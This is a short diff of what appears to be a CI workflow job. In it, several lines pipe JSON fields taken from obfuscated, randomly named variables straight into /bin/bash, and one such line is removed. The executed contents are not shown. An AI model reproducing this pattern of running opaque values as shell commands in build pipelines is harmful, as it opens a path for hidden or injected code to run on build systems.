@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$giwya5657" | jq -r .su830 | /bin/bash
           printf '%s' "$qot16" | jq -r .wkf06 | /bin/bash
           printf '%s' "$fvlcq71913" | jq -r .s6451 | /bin/bash
-          printf '%s' "$y98" | jq -r .qy5015 | /bin/bash
           printf '%s' "$kq07963" | jq -r .hvbm7782 | /bin/bash
 
       - name: Store artifact
